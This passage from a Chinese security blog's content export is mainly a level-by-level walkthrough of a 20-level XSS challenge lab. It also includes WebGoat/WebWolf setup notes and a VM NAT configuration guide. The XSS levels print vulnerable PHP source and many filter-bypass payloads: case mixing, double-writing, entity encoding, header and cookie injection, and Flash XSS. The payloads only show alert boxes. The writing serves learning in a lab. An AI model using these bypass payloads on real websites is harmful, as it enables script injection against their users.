distinction between what was part of the \"attackers\" role and what was part of the \"users\" role on the website. The following items are supported in WebWolf:\n>\n>WebWolf是一个单独的web应用程序，它模拟攻击者的机器。它使我们有可能在被攻击的网站上发生的事情和作为“攻击者”需要采取的行动之间做出明确的区分。WebWolf是在几次研讨会之后推出的，我们在研讨会上得到的反馈是，网站上的“攻击者”角色和“用户”角色之间没有明显的区别。\n>\n>- Hosting a file\n>- Receiving email\n>- Landing page for incoming requests\n>- 举办一个文件\n>- 接收电子邮件\n>- 输入请求的登录页\n>\n>WebWolf runs as a separate web application. If you are using the Docker-compose file you can just point your browser [here](http://192.168.64.1:9090/WebWolf) to open WebWolf.\n>If you want to use the standalone version, you will need to download the jar file and start it:\n>\n>WebWolf作为一个单独的web应用程序运行。如果你正在使用Docker-compose文件，你可以将你的浏览器指向这里来打开WebWolf。如果你想使用独立版本，你需要下载jar文件并启动它:\n>\n>\n>\n>```\n>java -jar webwolf-<<version>>.jar [--server.port=9090] [--server.address=localhost]\n>```\n>\n>By default WebWolf starts on port 9090 with `--server.port` you can specify a different port. With `server.address` you\n>can bind it to a different address (default localhost)\n>\n>默认情况下，WebWolf在端口9090上用——server启动。您可以指定一个不同的端口。与服务器。您可以将它绑定到另一个地址(默认的本地主机)\n>\n>Note: if you start WebGoat as standalone application you need to start WebWolf as standalone application as well.\n>\n>注意:如果你启动WebGoat作为一个独立的应用程序，你需要启动WebWolf作为一个独立的应用程序。\n>\n>This will start the application on port 9090, click [here](http://192.168.64.1:9090/WebWolf) to open WebWolf.\n>The first thing you need to do is login with the user you registered on WebGoat.\n>\n>这将在端口9090上启动应用程序，点击这里打开WebWolf。你需要做的第一件事是用你在WebGoat上注册的用户登录。\n\n## 0x04 General\n\n### Http Proxies\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191014140557.png)\n\n* Stage 2 \n\n在下面的输入框中输入您的名字，然后按“Go!”提交。服务器将接受请求，反转输入并将其显示给用户，说明处理HTTP请求的基础知识。\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191014140948.png)\n\n* Stage 3\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191014141607.png)\n\n\n\n### HTTP Proxies\n\n前面几步介绍代理的流程，最后进行测试\n\n```\nChange the Method to GET\n\nAdd a header 'x-request-intercepted:true'\n\nChange the input value 'changeMe' to 'Requests are tampered easily' (without the single quotes)\n```\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191014142707.png)\n\n\n\n### CIA triad\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191014143347.png)\n\n###  goole chrome developer tools\n\n-1551252461\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191014143931.png)\n\n \n\nstage 6\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191014144213.png)\n\n### \n\n","tags":["OWASP"],"categories":["WEB安全"]},{"title":"xss通关小游戏","url":"/2019/10/05/web安全/XSS/XSS闯关小游戏/","content":"\n# xss 通关小游戏\n\n## 搭建环境\n\n下载 xss 通关小游戏\n\n文件来自于：[https://www.cnblogs.com/bmjoker/p/9446472.html](https://www.cnblogs.com/bmjoker/p/9446472.html)\n\n> 相信phpstudy\n>\n> 在官网安装最新版的phpstudy，通过360、火绒检查不存在问题后，安装到自定义目录下\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/1570177833994.png)\n\n\n搭建非常简单，点两下，拖一个文件进去，就好了。\n\n## 通关之旅\n\n> 很张狂的一个小人，不服就来啊\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570178216576.png)\n\n\n### Less1\n\n第一关可以看到，url处输入的信息，会返回`欢迎用户xxx` 这让我想去注入一下，话说回来，赶紧看看怎么弹xss吧\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570178276534.png)\n\n\n看一下前端的页面，是否存在过滤，没有绕过，只需要输入弹xss的语句就可以了\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570178710972.png)\n\n\n上payload\n\n```\n<script>alert(3444)</script>\n```\n\n\n\n成功\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570178885846.png)\n\n\n最后看一下源码\n```\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"name\"];\necho \"<h2 align=center>欢迎用户\".$str.\"</h2>\";\n?>\n<center><img src=level1.png></center>\n<?php \necho \"<h3 align=center>payload的长度:\".strlen($str).\"</h3>\";\n?>\n</body>\n</html>\n\n```\n将拿到的值 直接放入去echo，xss无疑</pre>\n\n然后测试了一下我收集的xss ，以下都可以通过\n```\n<scRIpT>new class extends confirm`4`{}</SCripT> //绕过script大小写，括号，alert等函数\n\n<script>(((confirm)))`666`</script> // 绕过括号，alert等函数限制\n\n<script>co\\u006efirm(666)</script>\n\n<svg/onload=alert(1111)>\n\n<script>{confirm`NB`}</script>\n\n<script>alert`111`</script>\n\n%3c/title%3e%3cscript%3ealert`%22xss%22`%3c/script%3e\n\n其中有的虽然弹了xss 但是没有跳转到下一关\n```\n### Less2\n\n看来这一关，有两个位置可以传参， 而且但是发现这两个位置是相同的，所以测试点只有一个\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570180389460.png)\n\n\n看一下前端，传入一个简单的xss，发现`<>`都被转义了。\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570180493035.png)\n\n\n试试闭合\n```\npayload: \"><script>alert(555)</script>< // 绕过\n\n```\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570180867736.png)\n\n这里加“ 的目的是闭合前面的值，之后添加xss脚本即可成功弹shell\n\n\n\n看看别人是如何弹的\n\n```\npayload\n\" onmouseover=alert(3)> // 需要鼠标移动到输入框\n\" onclick=alert(4)> // 需要点击\n\"> <img src = \"a\" onerror=\"alert(5)\">\n其实只要有“ 其他都随意了\n```\n在试试fuzz\n`劝各位少试 ，崩了别怪我没提醒`\n\n差点忘记看源码了\n```\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level2.php method=GET>\n<input name=keyword  value=\"'.$str.'\">\n<input type=submit name=submit value=\"搜索\"/>\n</form>\n</center>';\n?>\n<center><img src=level2.png></center>\n<?php \necho \"<h3 align=center>payload的长度:\".strlen($str).\"</h3>\";\n?>\n</body>\n</html>\n\n多了个函数htmlspecialchars\n看看他的用法\n\n将特殊字符转换为 HTML 实体， 包括： & \" ' < >\n所以直接去执行简单的payload都会被过滤，但是过滤不严格，使用“> 闭合之后 函数就是失效了\n\n```\n### Less3\n\n>先用简单的去看看\n```\n\"<script>alert(6)</script> //\"  < > 都被绕过</pre>\n```\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570183909634.png)\n\n\n那么就需要没有这几个特征的,比如上一关提到的 点击事件和划过窗口事件\n```\n' onmousedown='alert(7)  闭合\n' onclick='alert(8)\n<input name=keyword  value='\".htmlspecialchars($str).\"onmousedown='alert(9) '>\n' onmousedown=alert(10)// 注释\n' onclick=alert(11)//\n<input name=keyword  value='\".htmlspecialchars($str).\"onclick=alert(12)// '>\n```\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570184810646.png)\n\n\n看一下代码\n\n```\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".\"<center>\n<form action=level3.php method=GET>\n<input name=keyword  value='\".htmlspecialchars($str).\"'>\n<input type=submit name=submit value=搜索 />\n</form>\n</center>\";\n?>\n<center><img src=level3.png></center>\n<?php \necho \"<h3 align=center>payload的长度:\".strlen($str).\"</h3>\";\n?>\n\n这里也用了htmlspecialchars ，但是通过 .. 去追加的，所以不能直接使用双引号进行绕过\n从value中可以看到单引号引起，所以使用单引号去闭合。\n```\n### Less-4\n\n>尝试拿payload 去试，看看 过滤了什么\n>发现之后' 没有被过滤，那么 这里很可能只有单引号属于正常的</pre>\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570186377800.png)\n\n\n尝试双引号闭合，发现这道题和上一道可能就是单引号和双引号的区别了\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570186447377.png)\n\n\n看看源码\n\n```\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str2=str_replace(\">\",\"\",$str);\n$str3=str_replace(\"<\",\"\",$str2);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level4.php method=GET>\n<input name=keyword  value=\"'.$str3.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n\n```\n```\n这里添加一个payload\n\"onfocus=alert(13) autofocus=\"   //onfocus 事件在对象获得焦点时发生。同样可以放在第三关去绕过\n或者 \n\" onfocus=alert(14) // \n```\n### Less-5\n\n先查看过滤的内容 经过测试发现 on，script被过滤了，这时尝试使用其他的函数绕过\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570188039661.png)\n\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570188154325.png)\n\n\n这时想到还有javascript可以使用\n```\npayload\n\"><iframe src=javascript:alert(15)>\n\n\"> <iframe src=\"javascript:alert(16)\">\n\n```\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570188390066.png)\n\n\n但是没有出来下一关提示，别急，还有，herf也可以用\n```\n\"><a href=\"javascript:alert(17)\">\n```\n点击标签，成功绕过\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570188777396.png)\n\n\n看下源码\n```\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"<script\",\"<scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level5.php method=GET>\n<input name=keyword  value=\"'.$str3.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n```\n先转了小写， 大小写失效了，之后替换，script失效了，然后on 事件也失效了，之后就可以想想其他过滤， href可以，ifame 也可以，<> 正常，所以限制也就少了\n所以这次可以通过javascript去执行语句，将javascript嵌套到href或ifame都可以实现绕过\n\n### Less-6\n\n>随便输入，查看过滤了什么\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570189440237.png)\n\n' o_nmousedown=alert(8)//  script也被过滤了\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570189528991.png)\n\n\n试试上一题的payload \"><a href=javascript:alert(19)>\n\nhref 也被过滤了\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570189606811.png)\n\n\n\nsrc 也被过滤了\n\n\n这时 有点蒙了，都过滤了，怎么测，想起来还有个大小写没有试\n果然 天无绝人之路 大小写没有过滤\n```\n\"><iframe sRc=javascript:alert(20)>\n\"><a hREf=\"javascript:alert(21)\">\n```\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570189698861.png)\n\n看看源码\n```\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str2=str_replace(\"<script\",\"<scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\n$str4=str_replace(\"src\",\"sr_c\",$str3);\n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level6.php method=GET>\n<input name=keyword  value=\"'.$str6.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n可以当做黑名单过滤\nscript，on，src，data，href\n这里首次出现了data，查阅一下资料，看看data是如何触发xss的\ndata:text/html,alert('xss');</pre>\n```\n### Less-7\n\n> 方法不变测试过滤\n>\n> 这次是检测到删除，双引号被过滤\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570190052543.png)\n\n\n> 删除 如果是匹配删除，那么双写即可绕过\n>\n> paylaod: \"><scscriptript>alert(/xss/)</scriscriptpt>\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570190355881.png)\n\n\n看看源码\n\n```\n<?php \nini_set(\"display_errors\", 0);\n$str =strtolower( $_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"\",$str);\n$str3=str_replace(\"on\",\"\",$str2);\n$str4=str_replace(\"src\",\"\",$str3);\n$str5=str_replace(\"data\",\"\",$str4);\n$str6=str_replace(\"href\",\"\",$str5);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level7.php method=GET>\n<input name=keyword  value=\"'.$str6.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n果然是 匹配到函数就删除，这样 双写很容易绕过\n```\n\n### Less-8\n\n>测试过滤字符，测试onclick,之后查看友情链接，发现on 被替换了data，script，href等都被替换了，这里前面的方法都失效了，</pre>\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570190584596.png)\n\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570190610967.png)\n\n\n> 百度一下，发现可以通过编码去绕过，通过html字符实体转换 将 r 换为&#x72\n>\n> 成功绕过替换\n```\npayload\njavascrip&#x74;:alert(22)\njavasc&#x72;ipt:alert`1`\n```\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570191267443.png)\n\n\n看看源码\n\n```\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\n$str4=str_replace(\"src\",\"sr_c\",$str3);\n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);\n$str7=str_replace('\"','&quot',$str6);\necho '<center>\n<form action=level8.php method=GET>\n<input name=keyword  value=\"'.htmlspecialchars($str).'\">\n<input type=submit name=submit value=添加友情链接 />\n</form>\n</center>';\n?>\n前面的过滤不说了，引号被编码了，这样html实体无法使用00去截断，\n\n```\n### Less-9\n\n>常规判断\n>这次没有任何回显，只给了不合法，难度比之前的有很大的提升，这次绕过让我忽略了一个问题，友情链接没有网址那叫链接吗，百度了下绕过，发现一只忽略了一个最重要的问题\n```\npayload\njavascrip&#74;:alert(23)//http://www.baidu.com</pre>\n```\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570191396570.png)\n\n\n看看源码\n```\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\n$str4=str_replace(\"src\",\"sr_c\",$str3);\n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);\n$str7=str_replace('\"','&quot',$str6);\necho '<center>\n<form action=level9.php method=GET>\n<input name=keyword  value=\"'.htmlspecialchars($str).'\">\n<input type=submit name=submit value=添加友情链接 />\n</form>\n</center>';\n?>\n<?php\nif(false===strpos($str7,'http://'))\n{\n echo '<center><BR><a href=\"您的链接不合法？有没有！\">友情链接</a></center>';\n }\nelse\n{\n echo '<center><BR><a href=\"'.$str7.'\">友情链接</a></center>';\n}\n?>\n\n前面不说了，看看后面，这里需要判断是否存在http:// 判断链接是否合法，这里我们直接在最后添加就可以绕过了\n\n```\n### Less-10\n\n> 慢慢的难度提升了，这道题直接闭合不了，基本没有测出来什么东西，抓个包看看吧，也没啥，看看源代码，看到有三个参数是hidden的，尝试传参\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570204862947.png)\n```\npayload\nkeyword=1&t_sort=\"type=\"text\" onclick=\"alert(24)\n\n<input name=\"t_sort\" value=\" \" type=\"text\" onclick = \"alert(25)\" type=\"hidden\">\ntype=\"text\" 指定后可以将hidden内容显示</pre>\n```\n创建一个文本框，然后去点击\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570204987345.png)\n\n\n```\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str11 = $_GET[\"t_sort\"];\n$str22=str_replace(\">\",\"\",$str11);\n$str33=str_replace(\"<\",\"\",$str22);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form id=search>\n<input name=\"t_link\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_history\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_sort\"  value=\"'.$str33.'\" type=\"hidden\">\n</form>\n</center>';\n?>\n\nget 获取两个变量，之后过滤了<> 然后html实体化，之后在t_sort 中通过value赋值绕过引起xss\n\n```\n### Less-11\n\n和10题类似，同样有隐藏的内容，尝试type指定为text查看\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570242428551.png)\n\n\nkeyword=good job!&t_sort=\"type=\"text\" onclick=\"alert(26) 被转义了，看来这里很难绕过了。请教了下百度\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570242567789.png)\n\n\n 这题先看源码吧\n\n```\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str00 = $_GET[\"t_sort\"];\n$str11=$_SERVER['HTTP_REFERER'];\n$str22=str_replace(\">\",\"\",$str11);\n$str33=str_replace(\"<\",\"\",$str22);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form id=search>\n<input name=\"t_link\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_history\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_sort\"  value=\"'.htmlspecialchars($str00).'\" type=\"hidden\">\n<input name=\"t_ref\"  value=\"'.$str33.'\" type=\"hidden\">\n</form>\n</center>';\n?>\n果然，这道题的关键点在str11参数，获取referer处，查看前端源码也可以获取到一个t_ref变量，那么对于str11只过滤了<> 这样就可以使用on去绕过了\n```\n```\npayload 抓包 在Referer处添加\n“ onmouseover=alert(26) type=\"text\"</pre>\n```\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570243195814.png)\n\n\n### Less-12\n\n> 测试各个位置是否存在xss ，然后记得长个心眼，比如 referer，ua位置也要记得测试\n>\n> 这道题，ua处隐藏了，但是value获取了值，这里很可能存在xss\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570243379119.png)\n\n\n果然，在ua处添加xss代码成功弹xss\n```\npayload\n\" onclick=alert(27) type=\"text\"</pre>\n```\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570243485003.png)\n\n\n看看源码\n```\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str00 = $_GET[\"t_sort\"];\n$str11=$_SERVER['HTTP_USER_AGENT'];\n$str22=str_replace(\">\",\"\",$str11);\n$str33=str_replace(\"<\",\"\",$str22);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form id=search>\n<input name=\"t_link\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_history\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_sort\"  value=\"'.htmlspecialchars($str00).'\" type=\"hidden\">\n<input name=\"t_ua\"  value=\"'.$str33.'\" type=\"hidden\">\n</form>\n</center>';\n?>\n\n和上一题一样，对于ua处只判断了<> 这里使用on事件直接绕过\n```\n### Less-13\n\n> 同样检查一下源代码，可能存在绕过，看变量那么这道题的关键就是cookie了\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570243622176.png)\n\n\n> 抓包 修改cookie，尝试弹xss\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570243693173.png)\n\n```\npayload\n\" onmousedown=alert(28) type=\"text\"\n```\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570243732008.png)\n\n\n看看源码\n```\n<?php \nsetcookie(\"user\", \"call me maybe?\", time()+3600);\nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str00 = $_GET[\"t_sort\"];\n$str11=$_COOKIE[\"user\"];\n$str22=str_replace(\">\",\"\",$str11);\n$str33=str_replace(\"<\",\"\",$str22);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form id=search>\n<input name=\"t_link\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_history\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_sort\"  value=\"'.htmlspecialchars($str00).'\" type=\"hidden\">\n<input name=\"t_cook\"  value=\"'.$str33.'\" type=\"hidden\">\n</form>\n</center>';\n?>\n同12和11 在cookie处返回的时候没有过滤完全导致xss\n```\n\n### Less-14\n\n> 查看绕过信息，查看源代码\n```\n<html><head><title>Loading...</title></head><body><script type='text/javascript'>window.location.replace('http://www.exifviewer.org/?js=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJKb2tlbiIsImV4cCI6MTU3MDI1MzMxNCwiaWF0IjoxNTcwMjQ2MTE0LCJpc3MiOiJKb2tlbiIsImpzIjoxLCJqdGkiOiIybjVhNTFjNXM3dWg3cnY1aW8wMDlya2YiLCJuYmYiOjE1NzAyNDYxMTQsInRzIjoxNTcwMjQ2MTE0NDUyNTIyfQ.T1jdJkux82fMYT9U0brel9BKH1n0876y_n_pLpdTug0&sid=74b4763c-e71f-11e9-875c-26f312502ec5');</script></body></html></pre>\n```\n这关不知道怎么过了，再次百度,\n```\npayload  exif viewer的漏洞,漏洞原理是通过修改图片的exif信息\n \"><img src=1 onerror=alert(29)></pre>\n```\n```\n<html>\n<head>\n<meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\">\n<title>欢迎来到level14</title>\n</head>\n<body>\n<h1 align=center>欢迎来到level14</h1>\n<center><iframe name=\"leftframe\" marginwidth=10 marginheight=10 src=\"http://www.exifviewer.org/\" frameborder=no width=\"80%\" scrolling=\"no\" height=80%></iframe></center><center>这关成功后不会自动跳转。成功者<a href=/xsschallenge/level15.php?src=1.gif>点我进level15</a></center>\n</body>\n</html>\n这关好像没php代码，果然崩了下一关\n\n```\n### Less-15\n\n15关怎么挂了，看看源码先\n\n```\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"src\"];\necho '<body><span class=\"ng-include:'.htmlspecialchars($str).'\"></span></body>';\n?>\n```\n打不成功，查看没有反应，这关考的是对于ng-include 通过文件包含加载xss\n\n放几个网上找来的payload\n```\npayload\n\n'level1.php?name=<script>alert(30)</script>'\n'level1.php?name=<img src=x onerror=alert(31)>'</pre>\n```\n### Less-16\n\n> 测试输入，感觉又和之前的比较相似了\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570247865284.png)\n\n过滤了script，/ , 空格也被替换了,尝试使用%0a代替空格\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570247953475.png)\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570247954916.png)\n\n```\npayload\n<svg%0Aonclick=alert(32)>\n<img%0Dsrc=1%0Donerror=alert(33)>\n<img%0Asrc=1%0Aonerror=alert(34)>\n<ifame%0asrc=1%0aonmouseover=alert(35)></ifame></pre>\n```\n\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570248128780.png)\n\n\n看看源码\n```\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"&nbsp;\",$str);\n$str3=str_replace(\" \",\"&nbsp;\",$str2);\n$str4=str_replace(\"/\",\"&nbsp;\",$str3);\n$str5=str_replace(\"  \",\"&nbsp;\",$str4);\necho \"<center>\".$str5.\"</center>\";\n?>\n替换，大小写，之后输出，所以这里需要通过编码绕过</pre>\n```\n### Less-17\n\n> 传入了两个变量，所以这关有可能xss在其中一个，或者都可能被利用\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570248684745.png)\n\n看看源代码\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570248784662.png)\n\n\n\n尝试使用on去弹 失败\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570248786085.png)\n\n\n\n 查看下源码\n```\n<!DOCTYPE html><!--STATUS OK--><html>\n<head>\n<meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\">\n<script>\nwindow.alert = function()  \n{ \nconfirm(\"完成的不错！\"); \n}\n</script>\n<title>欢迎来到level17</title>\n</head>\n<body>\n<h1 align=center>欢迎来到level17</h1>\n<?php\nini_set(\"display_errors\", 0);\necho \"<embed src=xsf01.swf?\".htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).\" width=100% heigth=100%>\";\n?>\n<h2 align=center>成功后，<a href=level18.php?arg01=a&arg02=b>点我进入下一关</a></h2>\n</body>\n</html>\n\n通过追加写入src中\n```\n>弹不出来 ，难受\n```\n看看别人是怎么写的\narg01= onmousemove&arg02=alert(36) ，以追加的形式构成xss脚本，\narg01=1&arg02= onmouseover=alert(37) 直接以事件形式弹</pre>\n```\n\n### Less-18\n\n> 和17类似 构造事件, 灵异事件 弹不成功\n```\npayload\narg01= onmousemove&arg02=alert(38) ，以追加的形式构成xss脚本，\narg01=1&arg02= onmouseover=alert(39) 直接以事件形式弹</pre>\n```\n源码\n```\n<!DOCTYPE html><!--STATUS OK--><html>\n<head>\n<meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\">\n<script>\nwindow.alert = function()  \n{ \nconfirm(\"完成的不错！\");\n window.location.href=\"level19.php?arg01=a&arg02=b\"; \n}\n</script>\n<title>欢迎来到level18</title>\n</head>\n<body>\n<h1 align=center>欢迎来到level18</h1>\n<?php\nini_set(\"display_errors\", 0);\necho \"<embed src=xsf02.swf?\".htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).\" width=100% heigth=100%>\";\n?>\n</body>\n</html>\n\n感觉和17差不多，不多说了\n```\n\n\n### Less-19\n\n> 19 和20 难度较大，这里\n\n```\n<!DOCTYPE html><!--STATUS OK--><html>\n<head>\n<meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\">\n<script>\nwindow.alert = function()  \n{ \nconfirm(\"完成的不错！\");\n window.location.href=\"level20.php?arg01=a&arg02=b\"; \n}\n</script>\n<title>欢迎来到level19</title>\n</head>\n<body>\n<h1 align=center>欢迎来到level19</h1>\n<?php\nini_set(\"display_errors\", 0);\necho '<embed src=\"xsf03.swf?'.htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).'\" width=100% heigth=100%>';\n?>\n</body>\n</html></pre>\n```\n> 这道题是flash xss\n\n不咋会做 放上payload\n```\npayload\narg01=version&arg02=<a href=\"javascript:alert(40)\">123</a>\n```\n即不会做之后再次研究 flash xss\n\n首先下载[jpexs-decompiler](https://github.com/jindrapetrik/jpexs-decompiler),安装需要java环境\n\n定位到sIFR 找到对应的getURL\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191006101304.png)\n\n之后在往下看，发现sIFR.version\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191006101607.png)\n\n可以看到version 传入loc4 ,但是getURL 只在内容为link时，分析contentlsLink\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191006102240.png)\n\n之后就可以知道构造的原理了，通过`<a>``</a>` 去传值就可以了\n\n### Less-20\n\n不会做\n```\narg01=id&arg02=\\%22))}catch(e){}if(!self.a)self.a=!alert(1)//%26width%26height\n```\n---\n参考文章：\n\n[https://www.jianshu.com/p/4e3a517bc4ea](https://www.jianshu.com/p/4e3a517bc4ea)\n\n[https://www.cnblogs.com/bmjoker/p/9446472.html](https://www.cnblogs.com/bmjoker/p/9446472.html)\n\n[https://blog.csdn.net/weixin_44077544/article/details/95174440](https://blog.csdn.net/weixin_44077544/article/details/95174440)","tags":["xss"],"categories":["WEB安全"]},{"title":"配置NAT实现网络互通","url":"/2019/10/04/实用技巧/配置nat实现网络互通/","content":"\n配置nat 实现主机互通\n\n<!-- more -->\n\n# 前言\n\n参加了拼客学院的第十期五天速成白帽子培训课，然后把一些常见的知识分享给大家\n\n\n\n## 安装靶机\n\n下载的话网上都有直接去下就好了。\n\n安装比较简单，这里推荐安装过程\n\n[Winxp安装教程](https://jingyan.baidu.com/article/b24f6c821cb98d86bfe5da83.html)\n\n[Win2003安装教程](https://jingyan.baidu.com/article/9989c746d4f914f648ecfe2f.html)\n\n\n\n# 配置NAT 实现互通\n配置nat过程都一样，所以这里只演示一种方式  \n以`winxp`为例  \n- 打开虚拟机，选择以vmmware形式打开\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20190710230814.png)\n- 配置网卡为NAT模式\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/9/20190710231547.png)\n\n- 打开cmd 输入ipconfig 即可查看配置\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/9/20190710231222.png)\n3 ping win2003主机，查看是否连通\n\n- ping 网络中的某个网站，测试是否连通\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/9/20190710231326.png)\n\n## 遇到的坑\n如果你得vmnet8 没有配置正确是不能访问网络的\n附上我的配置，如果有错误可以照着我的改\n- 虚拟网络适配器\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/9/20190710232159.png)\n- NAT 